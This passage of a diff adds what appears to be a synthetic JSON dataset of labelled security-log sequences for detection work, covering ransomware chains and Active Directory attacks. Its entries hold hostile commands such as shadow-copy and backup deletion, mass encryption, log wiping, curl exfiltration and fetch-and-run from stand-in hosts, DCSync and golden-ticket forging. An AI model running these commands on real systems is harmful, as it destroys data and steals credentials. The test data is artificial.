@@ -1,0 +1,2122 @@
+[
+  {
+    "unit": 1081,
+    "family": "FA",
+    "family_title": "勒索与数据破坏链",
+    "file": "data-1081-1100.txt",
+    "technique": "文件上传落地 WebShell 后删除卷影并批量加密共享目录",
+    "source_sequence": [
+      "rasp",
+      "hids",
+      "hids"
+    ],
+    "start": "2026-07-13 15:32:46",
+    "entries": [
+      {
+        "n": 1,
+        "ts": "2026-07-13 15:32:46",
+        "source": "rasp",
+        "log_id": "RASP0543334",
+        "content": "https://app-php-12.ops-corp.com/wp-admin/admin-ajax.php?action=upload {\"upload\": \"upd.php\", \"cmd\": \"vssadmin d"
+      },
+      {
+        "n": 2,
+        "ts": "2026-07-13 15:34:14",
+        "source": "hids",
+        "log_id": "HID0532191",
+        "content": "cipher /e /s:C:\\inetpub\\data cipher.exe cipher.exe /e /s:C:\\inetpub\\data <== php-cgi.exe"
+      },
+      {
+        "n": 3,
+        "ts": "2026-07-13 15:38:34",
+        "source": "hids",
+        "log_id": "HID0532213",
+        "content": "vssadmin delete shadows /all /quiet cmd.exe cmd.exe /c vssadmin delete shadows /all /quiet <== php-cgi.exe"
+      }
+    ]
+  },
+  {
+    "unit": 1082,
+    "family": "FA",
+    "family_title": "勒索与数据破坏链",
+    "file": "data-1081-1100.txt",
+    "technique": "凭据复用横向登录文件服务器后关闭恢复环境并加密数据盘",
+    "source_sequence": [
+      "hids",
+      "hids"
+    ],
+    "start": "2026-07-30 17:58:28",
+    "entries": [
+      {
+        "n": 1,
+        "ts": "2026-07-30 17:58:28",
+        "source": "hids",
+        "log_id": "HID0660425",
+        "content": "net use \\\\10.20.3.61\\files$ && bcdedit /set recoveryenabled no cmd.exe cmd.exe /c net use <== cmd.exe /c net <"
+      },
+      {
+        "n": 2,
+        "ts": "2026-07-30 18:01:13",
+        "source": "hids",
+        "log_id": "HID0660439",
+        "content": "cipher /e /s:C:\\files\\2026q2 cipher.exe cipher.exe /e /s:C:\\files\\2026q2 <== cmd.exe /c cipher.exe"
+      }
+    ]
+  },
+  {
+    "unit": 1083,
+    "family": "FA",
+    "family_title": "勒索与数据破坏链",
+    "file": "data-1081-1100.txt",
+    "technique": "RDP 弱口令爆破成功后删除备份编录并外传加密密钥",
+    "source_sequence": [
+      "hids",
+      "dns",
+      "dns",
+      "dns"
+    ],
+    "start": "2026-07-27 10:02:01",
+    "entries": [
+      {
+        "n": 1,
+        "ts": "2026-07-27 10:02:01",
+        "source": "hids",
+        "log_id": "HID0635447",
+        "content": "mstsc /v:10.20.3.61 && wbadmin delete catalog -quiet && cipher /e /s:C:\\db && curl -T C:\\db\\.k 10.20.5.19 cmd."
+      },
+      {
+        "n": 2,
+        "ts": "2026-07-27 12:38:01",
+        "source": "dns",
+        "log_id": "DNS0619200",
+        "content": "265662bc.tafmez-4b19.net A 192.0.2.128"
+      },
+      {
+        "n": 3,
+        "ts": "2026-07-27 12:38:41",
+        "source": "dns",
+        "log_id": "DNS0619204",
+        "content": "93624ea4.tafmez-4b19.net A 10.10.24.146"
+      },
+      {
+        "n": 4,
+        "ts": "2026-07-27 12:40:41",
+        "source": "dns",
+        "log_id": "DNS0619214",
+        "content": "c29e4024.tafmez-4b19.net A 10.10.35.69"
+      }
+    ]
+  },
+  {
+    "unit": 1084,
+    "family": "FA",
+    "family_title": "勒索与数据破坏链",
+    "file": "data-1081-1100.txt",
+    "technique": "注册每日计划任务投放加密脚本并删除 C 盘卷影副本",
+    "source_sequence": [
+      "hids",
+      "hids",
+      "hids"
+    ],
+    "start": "2026-07-12 14:11:38",
+    "entries": [
+      {
+        "n": 1,
+        "ts": "2026-07-12 14:11:38",
+        "source": "hids",
+        "log_id": "HID0524261",
+        "content": "schtasks /create /tn OpsSync /tr \"cmd.exe /c C:\\ProgramData\\ops.bat\" /sc daily /ru SYSTEM <== cmd.exe /c schta"
+      },
+      {
+        "n": 2,
+        "ts": "2026-07-12 14:12:18",
+        "source": "hids",
+        "log_id": "HID0524265",
+        "content": "vssadmin delete shadows /all /quiet /for=C: cmd.exe cmd.exe /c vssadmin delete shadows /for=C: <== cmd.exe /c "
+      },
+      {
+        "n": 3,
+        "ts": "2026-07-12 14:19:18",
+        "source": "hids",
+        "log_id": "HID0524301",
+        "content": "openssl enc -aes-256-cbc -pbkdf2 -salt -in C:\\share\\2026Q2.xlsx -out C:\\share\\2026Q2.xlsx.lock <== cmd.exe /c "
+      }
+    ]
+  },
+  {
+    "unit": 1085,
+    "family": "FA",
+    "family_title": "勒索与数据破坏链",
+    "file": "data-1081-1100.txt",
+    "technique": "PowerShell 载入器清理安全日志并删除卷影后循环加密文档",
+    "source_sequence": [
+      "hids",
+      "hids"
+    ],
+    "start": "2026-07-09 02:34:37",
+    "entries": [
+      {
+        "n": 1,
+        "ts": "2026-07-09 02:34:37",
+        "source": "hids",
+        "log_id": "HID0498135",
+        "content": "wevtutil cl System && wbadmin delete catalog -quiet cmd.exe cmd.exe /c wevtutil cl System <== services.exe <=="
+      },
+      {
+        "n": 2,
+        "ts": "2026-07-09 02:36:47",
+        "source": "hids",
+        "log_id": "HID0498146",
+        "content": "powershell -c \"$a=[Security.Cryptography.Aes]::Create();gci C:\\docs -r|%{$e=$a.CreateEncryptor();[IO.File]::Wr"
+      }
+    ]
+  },
+  {
+    "unit": 1086,
+    "family": "FA",
+    "family_title": "勒索与数据破坏链",
+    "file": "data-1081-1100.txt",
+    "technique": "停用 SQL Server 业务服务后删除卷影并加密 MDF 数据文件",
+    "source_sequence": [
+      "hids",
+      "hids",
+      "hids"
+    ],
+    "start": "2026-07-07 09:24:51",
+    "entries": [
+      {
+        "n": 1,
+        "ts": "2026-07-07 09:24:51",
+        "source": "hids",
+        "log_id": "HID0485273",
+        "content": "net stop MSSQLSERVER && net stop SQLSERVERAGENT cmd.exe cmd.exe /c net stop MSSQLSERVER <== cmd.exe /c net <=="
+      },
+      {
+        "n": 2,
+        "ts": "2026-07-07 09:25:16",
+        "source": "hids",
+        "log_id": "HID0485275",
+        "content": "vssadmin delete shadows /all /quiet && vssadmin resize shadowstorage /for=C: /on=C: /maxsize=401MB <== cmd.exe"
+      },
+      {
+        "n": 3,
+        "ts": "2026-07-07 09:26:51",
+        "source": "hids",
+        "log_id": "HID0485283",
+        "content": "openssl enc -aes-256-cbc -in C:\\SQL\\DATA\\orders.mdf -out C:\\SQL\\DATA\\orders.mdf.lock <== cmd.exe /c openssl <="
+      }
+    ]
+  },
+  {
+    "unit": 1087,
+    "family": "FA",
+    "family_title": "勒索与数据破坏链",
+    "file": "data-1081-1100.txt",
+    "technique": "挂载共享盘并删除编录后用 gpg 递归批量加密 Office 文档",
+    "source_sequence": [
+      "hids",
+      "hids"
+    ],
+    "start": "2026-07-25 03:37:40",
+    "entries": [
+      {
+        "n": 1,
+        "ts": "2026-07-25 03:37:40",
+        "source": "hids",
+        "log_id": "HID0618447",
+        "content": "net use Z: \\\\10.20.4.88\\share && wbadmin delete catalog -quiet cmd.exe cmd.exe /c net <== cmd.exe /c net <== s"
+      },
+      {
+        "n": 2,
+        "ts": "2026-07-25 03:40:05",
+        "source": "hids",
+        "log_id": "HID0618460",
+        "content": "for /r Z:\\ %i in (*.docx *.xlsx) do gpg -c --batch --passphrase-file /tmp/.k --yes %i cmd.exe cmd.exe /c for /"
+      }
+    ]
+  },
+  {
+    "unit": 1088,
+    "family": "FA",
+    "family_title": "勒索与数据破坏链",
+    "file": "data-1081-1100.txt",
+    "technique": "批量打包加密业务目录并投放 README_RESTORE.txt 说明文件",
+    "source_sequence": [
+      "rasp",
+      "hids"
+    ],
+    "start": "2026-07-10 10:10:15",
+    "entries": [
+      {
+        "n": 1,
+        "ts": "2026-07-10 10:10:15",
+        "source": "rasp",
+        "log_id": "RASP0518648",
+        "content": "https://app-node-33.ops-corp.com/api/v1/files/bulk {\"upload\": \"README_RESTORE.txt\", \"cmd\": \"gpg -c -o /srv.tgz"
+      },
+      {
+        "n": 2,
+        "ts": "2026-07-10 10:12:13",
+        "source": "hids",
+        "log_id": "HID0508017",
+        "content": "rm -rf /backup/* && tar czf - /srv/share | gpg -c -o /srv/share.tgz.gpg tar tar czf - /srv <== /bin/bash -c 'r"
+      }
+    ]
+  },
+  {
+    "unit": 1089,
+    "family": "FA",
+    "family_title": "勒索与数据破坏链",
+    "file": "data-1081-1100.txt",
+    "technique": "停用实时防护进程后删除卷影并用 cipher 批量加密运维目录",
+    "source_sequence": [
+      "hids"
+    ],
+    "start": "2026-07-29 06:10:53",
+    "entries": [
+      {
+        "n": 1,
+        "ts": "2026-07-29 06:10:53",
+        "source": "hids",
+        "log_id": "HID0649241",
+        "content": "net stop WinDefend && vssadmin delete shadows /all /quiet && gpg -c --batch --passphrase-file C:\\k.dat --yes C"
+      }
+    ]
+  },
+  {
+    "unit": 1090,
+    "family": "FA",
+    "family_title": "勒索与数据破坏链",
+    "file": "data-1081-1100.txt",
+    "technique": "通过 wmic 远程节点分发加密器并清除目标主机编录",
+    "source_sequence": [
+      "hids",
+      "hids",
+      "hids"
+    ],
+    "start": "2026-07-21 08:26:38",
+    "entries": [
+      {
+        "n": 1,
+        "ts": "2026-07-21 08:26:38",
+        "source": "hids",
+        "log_id": "HID0589956",
+        "content": "wmic /node:10.20.8.14 process call create \"cmd.exe /c copy \\\\10.20.3.9\\pub\\l.exe C:\\p.exe\" <== cmd.exe /c wmic"
+      },
+      {
+        "n": 2,
+        "ts": "2026-07-21 08:28:03",
+        "source": "hids",
+        "log_id": "HID0589963",
+        "content": "wmic /node:10.20.8.14 process call create \"cmd.exe /c C:\\p.exe -s C:\\share\" <== cmd.exe /c wmic <== services.e"
+      },
+      {
+        "n": 3,
+        "ts": "2026-07-21 08:31:38",
+        "source": "hids",
+        "log_id": "HID0589982",
+        "content": "cipher /e /s:C:\\share && wbadmin delete catalog -quiet cipher.exe cipher.exe /e /s:C:\\share <== cmd.exe /c cip"
+      }
+    ]
+  },
+  {
+    "unit": 1091,
+    "family": "FA",
+    "family_title": "勒索与数据破坏链",
+    "file": "data-1081-1100.txt",
+    "technique": "加密完成后删除本地归档备份并 shred 加密脚本与密钥自毁",
+    "source_sequence": [
+      "hids",
+      "hids"
+    ],
+    "start": "2026-07-25 09:12:35",
+    "entries": [
+      {
+        "n": 1,
+        "ts": "2026-07-25 09:12:35",
+        "source": "hids",
+        "log_id": "HID0620191",
+        "content": "openssl enc -aes-256-cbc -pass file:/tmp/.k -in /srv/db/orders.sql -out /srv/db/orders.sql.enc <== /bin/bash -"
+      },
+      {
+        "n": 2,
+        "ts": "2026-07-25 09:16:55",
+        "source": "hids",
+        "log_id": "HID0620214",
+        "content": "rm -rf /var/backups/* && shred -u /tmp/.enc.sh shred shred -u /tmp/.enc.sh <== /bin/bash"
+      }
+    ]
+  },
+  {
+    "unit": 1092,
+    "family": "FA",
+    "family_title": "勒索与数据破坏链",
+    "file": "data-1081-1100.txt",
+    "technique": "入侵备份服务器删除备份目录与 LVM 快照并外传文件清单",
+    "source_sequence": [
+      "hids",
+      "hids",
+      "dns",
+      "dns",
+      "dns"
+    ],
+    "start": "2026-07-13 00:35:20",
+    "entries": [
+      {
+        "n": 1,
+        "ts": "2026-07-13 00:35:20",
+        "source": "hids",
+        "log_id": "HID0527510",
+        "content": "ssh -i /tmp/.key -o StrictHostKeyChecking=no root@10.20.10.31 \"rm -rf /backup/*\" <== /bin/bash -c 'ssh' <== /u"
+      },
+      {
+        "n": 2,
+        "ts": "2026-07-13 00:36:30",
+        "source": "hids",
+        "log_id": "HID0527516",
+        "content": "tar czf - /srv/backup | gpg -c -o /tmp/b.tgz.gpg && lvremove -f /dev/vg0/bk_snap <== /bin/bash -c 'tar' <== /u"
+      },
+      {
+        "n": 3,
+        "ts": "2026-07-13 03:48:30",
+        "source": "dns",
+        "log_id": "DNS0512535",
+        "content": "c0565abc.qovzmi-9c31.net A 192.0.2.51"
+      },
+      {
+        "n": 4,
+        "ts": "2026-07-13 03:49:30",
+        "source": "dns",
+        "log_id": "DNS0512540",
+        "content": "76ecadab.qovzmi-9c31.net A 10.10.25.77"
+      },
+      {
+        "n": 5,
+        "ts": "2026-07-13 03:51:00",
+        "source": "dns",
+        "log_id": "DNS0512547",
+        "content": "d1004d20.qovzmi-9c31.net A 10.10.27.49"
+      }
+    ]
+  },
+  {
+    "unit": 1093,
+    "family": "FA",
+    "family_title": "勒索与数据破坏链",
+    "file": "data-1081-1100.txt",
+    "technique": "停用 mysqld 后删除归档备份并加密 InnoDB 表空间文件",
+    "source_sequence": [
+      "hids",
+      "hids",
+      "hids"
+    ],
+    "start": "2026-07-07 22:16:34",
+    "entries": [
+      {
+        "n": 1,
+        "ts": "2026-07-07 22:16:34",
+        "source": "hids",
+        "log_id": "HID0489292",
+        "content": "systemctl stop mysqld && rm -rf /var/backups/mysql mysqld mysqld systemctl stop mysqld <== /bin/bash -c 'syste"
+      },
+      {
+        "n": 2,
+        "ts": "2026-07-07 22:18:34",
+        "source": "hids",
+        "log_id": "HID0489302",
+        "content": "find /var/lib/mysql -name \"ib*.ibd\" -exec openssl enc -aes-256-cbc -in {} -out {}.enc \\; <== /bin/bash -c 'fin"
+      },
+      {
+        "n": 3,
+        "ts": "2026-07-07 22:22:34",
+        "source": "hids",
+        "log_id": "HID0489323",
+        "content": "printf \"data renamed to .enc\" > /srv/README_RESTORE.txt && rm -f /tmp/.k <== /bin/bash -c 'printf' <== /usr/sb"
+      }
+    ]
+  },
+  {
+    "unit": 1094,
+    "family": "FA",
+    "family_title": "勒索与数据破坏链",
+    "file": "data-1081-1100.txt",
+    "technique": "删除虚拟机快照后加密 vmdk 镜像文件并清除镜像备份",
+    "source_sequence": [
+      "hids",
+      "hids",
+      "hids"
+    ],
+    "start": "2026-07-07 17:17:03",
+    "entries": [
+      {
+        "n": 1,
+        "ts": "2026-07-07 17:17:03",
+        "source": "hids",
+        "log_id": "HID0487732",
+        "content": "virsh snapshot-delete web01 base --metadata virsh virsh snapshot-delete web01 base <== /bin/bash -c 'virsh' <="
+      },
+      {
+        "n": 2,
+        "ts": "2026-07-07 17:20:03",
+        "source": "hids",
+        "log_id": "HID0487748",
+        "content": "find /vmstore -name \"*.vmdk\" -exec gpg -c --batch --passphrase-file /tmp/.k {} \\; find find /vmstore -name <=="
+      },
+      {
+        "n": 3,
+        "ts": "2026-07-07 17:25:03",
+        "source": "hids",
+        "log_id": "HID0487774",
+        "content": "rm -rf /vmstore/snapshots/* && unlink /vmstore/base.vmdk.bak <== /bin/bash -c 'rm' <== /usr/sbin/cron <== /usr"
+      }
+    ]
+  },
+  {
+    "unit": 1095,
+    "family": "FA",
+    "family_title": "勒索与数据破坏链",
+    "file": "data-1081-1100.txt",
+    "technique": "删除卷影副本、全盘加密并投放 !RECOVER!.txt 说明文件",
+    "source_sequence": [
+      "hids",
+      "hids",
+      "hids"
+    ],
+    "start": "2026-07-01 10:43:02",
+    "entries": [
+      {
+        "n": 1,
+        "ts": "2026-07-01 10:43:02",
+        "source": "hids",
+        "log_id": "HID0440686",
+        "content": "vssadmin delete shadows /all /quiet && wbadmin delete catalog -quiet cmd.exe cmd.exe /c vssadmin <== cmd.exe /"
+      },
+      {
+        "n": 2,
+        "ts": "2026-07-01 10:43:57",
+        "source": "hids",
+        "log_id": "HID0440691",
+        "content": "powershell -c \"gci C:\\share -r|%{cipher /e $_.FullName}\" && echo note>C:\\share\\!RECOVER!.txt powershell.exe po"
+      },
+      {
+        "n": 3,
+        "ts": "2026-07-01 10:47:17",
+        "source": "hids",
+        "log_id": "HID0440708",
+        "content": "wevtutil cl Application && wevtutil cl System cmd.exe cmd.exe /c wevtutil cl <== cmd.exe /c wevtutil <== servi"
+      }
+    ]
+  },
+  {
+    "unit": 1096,
+    "family": "FA",
+    "family_title": "勒索与数据破坏链",
+    "file": "data-1081-1100.txt",
+    "technique": "配置安全模式启动后删除备份编录并加密数据分区",
+    "source_sequence": [
+      "hids",
+      "hids",
+      "hids"
+    ],
+    "start": "2026-07-30 04:48:50",
+    "entries": [
+      {
+        "n": 1,
+        "ts": "2026-07-30 04:48:50",
+        "source": "hids",
+        "log_id": "HID0656313",
+        "content": "bcdedit /set {default} safeboot network cmd.exe cmd.exe /c bcdedit /set {default} safeboot <== cmd.exe /c bcde"
+      },
+      {
+        "n": 2,
+        "ts": "2026-07-30 04:56:50",
+        "source": "hids",
+        "log_id": "HID0656354",
+        "content": "wbadmin delete catalog -quiet && wbadmin delete systemstatebackup -deleteOldest <== cmd.exe /c wbadmin <== ser"
+      },
+      {
+        "n": 3,
+        "ts": "2026-07-30 04:58:20",
+        "source": "hids",
+        "log_id": "HID0656362",
+        "content": "gpg -c --batch --passphrase-file D:\\k.dat --yes D:\\Data\\* && wevtutil cl Application cmd.exe cmd.exe /c cipher"
+      }
+    ]
+  },
+  {
+    "unit": 1097,
+    "family": "FA",
+    "family_title": "勒索与数据破坏链",
+    "file": "data-1081-1100.txt",
+    "technique": "PsExec 远程会话投放并运行加密器清空共享目录",
+    "source_sequence": [
+      "hids",
+      "hids"
+    ],
+    "start": "2026-07-08 23:05:17",
+    "entries": [
+      {
+        "n": 1,
+        "ts": "2026-07-08 23:05:17",
+        "source": "hids",
+        "log_id": "HID0497045",
+        "content": "psexec \\\\10.20.6.77 -s -d cmd.exe /c copy \\\\10.20.3.9\\pub\\openssl.exe C:\\openssl.exe <== cmd.exe /c psexec <=="
+      },
+      {
+        "n": 2,
+        "ts": "2026-07-08 23:08:27",
+        "source": "hids",
+        "log_id": "HID0497061",
+        "content": "psexec \\\\10.20.6.77 -s cmd.exe /c \"vssadmin delete shadows /all /quiet & openssl enc -aes-256-cbc -pass file:C"
+      }
+    ]
+  },
+  {
+    "unit": 1098,
+    "family": "FA",
+    "family_title": "勒索与数据破坏链",
+    "file": "data-1081-1100.txt",
+    "technique": "本地压缩加密后取走备份并删除原始数据目录形成双重破坏",
+    "source_sequence": [
+      "hids",
+      "hids",
+      "dns",
+      "dns",
+      "dns"
+    ],
+    "start": "2026-07-31 21:52:38",
+    "entries": [
+      {
+        "n": 1,
+        "ts": "2026-07-31 21:52:38",
+        "source": "hids",
+        "log_id": "HID0669143",
+        "content": "rm -rf /srv/data /var/backups/* && curl -T /tmp/bk.tgz.gpg http://203.0.113.44/u <== /bin/bash -c 'rm' <== /us"
+      },
+      {
+        "n": 2,
+        "ts": "2026-07-31 21:56:08",
+        "source": "hids",
+        "log_id": "HID0669161",
+        "content": "tar czf /tmp/bk.tgz /srv/data && gpg -c --batch --passphrase-file /tmp/.k /tmp/bk.tgz <== /bin/bash -c 'tar' <"
+      },
+      {
+        "n": 3,
+        "ts": "2026-07-31 23:44:08",
+        "source": "dns",
+        "log_id": "DNS0652331",
+        "content": "5c271b84.vexrum-77ad.net A 192.0.2.101"
+      },
+      {
+        "n": 4,
+        "ts": "2026-07-31 23:44:43",
+        "source": "dns",
+        "log_id": "DNS0652334",
+        "content": "176b8233.vexrum-77ad.net A 10.10.49.217"
+      },
+      {
+        "n": 5,
+        "ts": "2026-07-31 23:45:58",
+        "source": "dns",
+        "log_id": "DNS0652340",
+        "content": "7210db31.vexrum-77ad.net A 10.10.28.58"
+      }
+    ]
+  },
+  {
+    "unit": 1099,
+    "family": "FA",
+    "family_title": "勒索与数据破坏链",
+    "file": "data-1081-1100.txt",
+    "technique": "curl 下载加密脚本落地即执行并删除归档备份目录",
+    "source_sequence": [
+      "hids"
+    ],
+    "start": "2026-07-02 16:44:09",
+    "entries": [
+      {
+        "n": 1,
+        "ts": "2026-07-02 16:44:09",
+        "source": "hids",
+        "log_id": "HID0450066",
+        "content": "curl -fsSL 203.0.113.44/upd.sh -o /tmp/.u.sh && rm -rf /backup/* && sh /tmp/.u.sh && openssl enc -aes-256-cbc "
+      }
+    ]
+  },
+  {
+    "unit": 1100,
+    "family": "FA",
+    "family_title": "勒索与数据破坏链",
+    "file": "data-1081-1100.txt",
+    "technique": "Web 接口触发横向扩散后加密多台主机并清理认证日志",
+    "source_sequence": [
+      "rasp",
+      "hids",
+      "hids"
+    ],
+    "start": "2026-07-05 11:20:47",
+    "entries": [
+      {
+        "n": 1,
+        "ts": "2026-07-05 11:20:47",
+        "source": "rasp",
+        "log_id": "RASP0480738",
+        "content": "https://app-spring-142.ops-corp.com/api/v2/tasks/run {\"cmd\": \"bash deploy.sh --hosts 10.20.8.0/24\", \"template\""
+      },
+      {
+        "n": 2,
+        "ts": "2026-07-05 11:22:15",
+        "source": "hids",
+        "log_id": "HID0470886",
+        "content": "for h in 10.20.8.11 10.20.8.12; do ssh root@$h \"rm -rf /backup/*\"; done ssh ssh for h in <== /bin/bash -c 'for"
+      },
+      {
+        "n": 3,
+        "ts": "2026-07-05 11:27:55",
+        "source": "hids",
+        "log_id": "HID0470916",
+        "content": "openssl enc -aes-256-cbc -pass file:/tmp/.k -in /srv/vm -out /srv/vm.enc && shred -u /var/log/auth.log <== /bi"
+      }
+    ]
+  },
+  {
+    "unit": 1101,
+    "family": "FB",
+    "family_title": "域环境身份攻击链（AD/Kerberos）",
+    "file": "data-1101-1120.txt",
+    "technique": "域控与域管组枚举（net user /domain + nltest /dclist）",
+    "source_sequence": [
+      "hids"
+    ],
+    "start": "2026-07-24 07:39:17",
+    "entries": [
+      {
+        "n": 1,
+        "ts": "2026-07-24 07:39:17",
+        "source": "hids",
+        "log_id": "HID0612206",
+        "content": "net user /domain; nltest /dclist:corp.local net.exe net user /domain; nltest /dclist:corp.local <== cmd.exe /c"
+      }
+    ]
+  },
+  {
+    "unit": 1102,
+    "family": "FB",
+    "family_title": "域环境身份攻击链（AD/Kerberos）",
+    "file": "data-1101-1120.txt",
+    "technique": "BloodHound 图谱采集（SharpHound All + LDAP 批量查询）",
+    "source_sequence": [
+      "hids",
+      "hids",
+      "hids"
+    ],
+    "start": "2026-07-05 14:31:26",
+    "entries": [
+      {
+        "n": 1,
+        "ts": "2026-07-05 14:31:26",
+        "source": "hids",
+        "log_id": "HID0471872",
+        "content": "SharpHound.exe -c All --zipfilename bh.zip SharpHound.exe SharpHound.exe -c All <== CORP\\jdoe"
+      },
+      {
+        "n": 2,
+        "ts": "2026-07-05 14:35:26",
+        "source": "hids",
+        "log_id": "HID0471892",
+        "content": "Compress-Archive C:\\Users\\jdoe\\bh_*.json -Destination bh.zip powershell.exe Compress-Archive <== CORP\\jdoe"
+      },
+      {
+        "n": 3,
+        "ts": "2026-07-05 14:36:21",
+        "source": "hids",
+        "log_id": "HID0471897",
+        "content": "curl.exe -T bh.zip http://10.20.7.31/up curl.exe curl.exe -T bh.zip http://10.20.7.31/up <== CORP\\jdoe"
+      }
+    ]
+  },
+  {
+    "unit": 1103,
+    "family": "FB",
+    "family_title": "域环境身份攻击链（AD/Kerberos）",
+    "file": "data-1101-1120.txt",
+    "technique": "Kerberoasting（setspn 枚举 SPN + Rubeus kerberoast 导出票据）",
+    "source_sequence": [
+      "hids",
+      "hids"
+    ],
+    "start": "2026-07-18 05:46:28",
+    "entries": [
+      {
+        "n": 1,
+        "ts": "2026-07-18 05:46:28",
+        "source": "hids",
+        "log_id": "HID0566625",
+        "content": "setspn -T corp.local -Q */* setspn.exe setspn -T corp.local -Q */* <== CORP\\jdoe"
+      },
+      {
+        "n": 2,
+        "ts": "2026-07-18 05:54:18",
+        "source": "hids",
+        "log_id": "HID0566666",
+        "content": "Rubeus.exe kerberoast /outfile:krb.txt /domain:corp.local rubeus.exe Rubeus.exe kerberoast <== CORP\\jdoe"
+      }
+    ]
+  },
+  {
+    "unit": 1104,
+    "family": "FB",
+    "family_title": "域环境身份攻击链（AD/Kerberos）",
+    "file": "data-1101-1120.txt",
+    "technique": "AS-REP Roasting（GetNPUsers.py -request 免认证用户票据抓取）",
+    "source_sequence": [
+      "hids"
+    ],
+    "start": "2026-07-11 06:37:49",
+    "entries": [
+      {
+        "n": 1,
+        "ts": "2026-07-11 06:37:49",
+        "source": "hids",
+        "log_id": "HID0514399",
+        "content": "GetNPUsers.py -request -usersfile users.txt -format hashcat -dc-ip 10.20.3.10 corp.local/jdoe python3 GetNPUse"
+      }
+    ]
+  },
+  {
+    "unit": 1105,
+    "family": "FB",
+    "family_title": "域环境身份攻击链（AD/Kerberos）",
+    "file": "data-1101-1120.txt",
+    "technique": "域账号密码喷洒（crackmapexec smb 对 10.20.3.0/24）",
+    "source_sequence": [
+      "rasp",
+      "hids"
+    ],
+    "start": "2026-07-02 22:44:18",
+    "entries": [
+      {
+        "n": 1,
+        "ts": "2026-07-02 22:44:18",
+        "source": "rasp",
+        "log_id": "RASP0461402",
+        "content": "https://app-php-37.ops-corp.com/api/v2/auth/login {\"auth_spray\": \"svc_backup\"} Mozilla/5.0 (Windows NT 10.0; W"
+      },
+      {
+        "n": 2,
+        "ts": "2026-07-02 22:45:54",
+        "source": "hids",
+        "log_id": "HID0451950",
+        "content": "crackmapexec smb 10.20.3.0/24 -u users.txt -p 'Summer2026!' -d corp.local --continue-on-success cme cme crackm"
+      }
+    ]
+  },
+  {
+    "unit": 1106,
+    "family": "FB",
+    "family_title": "域环境身份攻击链（AD/Kerberos）",
+    "file": "data-1101-1120.txt",
+    "technique": "PrivExchange 推送订阅 + ntlmrelayx 中继 LDAP → secretsdump DCSync",
+    "source_sequence": [
+      "rasp",
+      "hids",
+      "hids"
+    ],
+    "start": "2026-07-11 22:02:51",
+    "entries": [
+      {
+        "n": 1,
+        "ts": "2026-07-11 22:02:51",
+        "source": "rasp",
+        "log_id": "RASP0530095",
+        "content": "https://app-iis-51.ops-corp.com/EWS/Exchange.asmx {\"ntlm_relay\": \"ldap://10.20.3.10\", \"push_sub\": true} Mozill"
+      },
+      {
+        "n": 2,
+        "ts": "2026-07-11 22:04:49",
+        "source": "hids",
+        "log_id": "HID0519227",
+        "content": "ntlmrelayx.py -t ldap://10.20.3.10 --escalate-user svc_scan ntlmrelayx.py <== /bin/bash -c"
+      },
+      {
+        "n": 3,
+        "ts": "2026-07-11 22:08:49",
+        "source": "hids",
+        "log_id": "HID0519247",
+        "content": "secretsdump.py -just-dc-user krbtgt CORP/administrator@dc01.corp.local secretsdump.py <== /bin/bash -c"
+      }
+    ]
+  },
+  {
+    "unit": 1107,
+    "family": "FB",
+    "family_title": "域环境身份攻击链（AD/Kerberos）",
+    "file": "data-1101-1120.txt",
+    "technique": "DCSync 拉取 krbtgt 哈希（lsadump::dcsync）并 DNS 隧道外传",
+    "source_sequence": [
+      "hids",
+      "hids",
+      "dns",
+      "dns",
+      "dns"
+    ],
+    "start": "2026-07-29 12:22:33",
+    "entries": [
+      {
+        "n": 1,
+        "ts": "2026-07-29 12:22:33",
+        "source": "hids",
+        "log_id": "HID0651176",
+        "content": "lsadump::dcsync /domain:corp.local /user:krbtgt /csv C:\\temp\\d.csv tk.exe <== CORP\\admin <== services.exe"
+      },
+      {
+        "n": 2,
+        "ts": "2026-07-29 12:26:03",
+        "source": "hids",
+        "log_id": "HID0651195",
+        "content": "powershell -c Resolve-DnsName (gc d.csv|%{$_.Substring(0,48)}) powershell.exe <== CORP\\admin"
+      },
+      {
+        "n": 3,
+        "ts": "2026-07-29 14:50:03",
+        "source": "dns",
+        "log_id": "DNS0634729",
+        "content": "8b9f0a68.qpvzmt-7c41.net A 10.10.41.201"
+      },
+      {
+        "n": 4,
+        "ts": "2026-07-29 14:51:03",
+        "source": "dns",
+        "log_id": "DNS0634734",
+        "content": "32e133b7.qpvzmt-7c41.net A 192.0.2.148"
+      },
+      {
+        "n": 5,
+        "ts": "2026-07-29 14:52:18",
+        "source": "dns",
+        "log_id": "DNS0634741",
+        "content": "24400230.qpvzmt-7c41.net A 10.10.42.236"
+      }
+    ]
+  },
+  {
+    "unit": 1108,
+    "family": "FB",
+    "family_title": "域环境身份攻击链（AD/Kerberos）",
+    "file": "data-1101-1120.txt",
+    "technique": "ntds.dit 影子副本复制外带（ntdsutil ifm → DNS 隧道）",
+    "source_sequence": [
+      "hids",
+      "dns",
+      "dns",
+      "dns"
+    ],
+    "start": "2026-07-15 13:35:03",
+    "entries": [
+      {
+        "n": 1,
+        "ts": "2026-07-15 13:35:03",
+        "source": "hids",
+        "log_id": "HID0546568",
+        "content": "ntdsutil \"ac i ntds\" \"ifm\" \"create full C:\\ifm\" q q ntdsutil.exe ntdsutil <== CORP\\admin <== services.exe"
+      },
+      {
+        "n": 2,
+        "ts": "2026-07-15 18:23:03",
+        "source": "dns",
+        "log_id": "DNS0531891",
+        "content": "044cedc3.nxbsru-91ad.net A 192.0.2.132"
+      },
+      {
+        "n": 3,
+        "ts": "2026-07-15 18:23:43",
+        "source": "dns",
+        "log_id": "DNS0531895",
+        "content": "d0f72a5c.nxbsru-91ad.net A 10.10.28.230"
+      },
+      {
+        "n": 4,
+        "ts": "2026-07-15 18:25:18",
+        "source": "dns",
+        "log_id": "DNS0531903",
+        "content": "4d82f127.nxbsru-91ad.net A 10.10.33.54"
+      }
+    ]
+  },
+  {
+    "unit": 1109,
+    "family": "FB",
+    "family_title": "域环境身份攻击链（AD/Kerberos）",
+    "file": "data-1101-1120.txt",
+    "technique": "黄金票据伪造（kerberos::golden /krbtgt: → ptt → 访问 DC C$）",
+    "source_sequence": [
+      "hids",
+      "hids",
+      "hids"
+    ],
+    "start": "2026-07-27 00:36:09",
+    "entries": [
+      {
+        "n": 1,
+        "ts": "2026-07-27 00:36:09",
+        "source": "hids",
+        "log_id": "HID0632500",
+        "content": "kerberos::golden /user:Administrator /domain:corp.local /sid:S-1-5-21-3104-512 /krbtgt:4f8a1c9d2b7e6351a0c4de8"
+      },
+      {
+        "n": 2,
+        "ts": "2026-07-27 00:36:34",
+        "source": "hids",
+        "log_id": "HID0632502",
